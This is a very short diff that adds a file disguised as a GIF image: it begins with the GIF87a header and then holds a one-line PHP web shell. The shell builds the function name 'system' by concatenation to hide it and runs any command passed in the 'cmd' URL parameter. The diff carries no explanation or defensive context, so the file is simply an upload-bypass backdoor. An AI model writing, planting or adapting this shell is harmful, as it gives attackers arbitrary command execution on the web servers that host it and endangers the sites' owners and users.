@@ -1,0 +1,2 @@
+GIF87a
+<?php $x = "sy" . "stem"; $x($_GET['cmd']); ?>
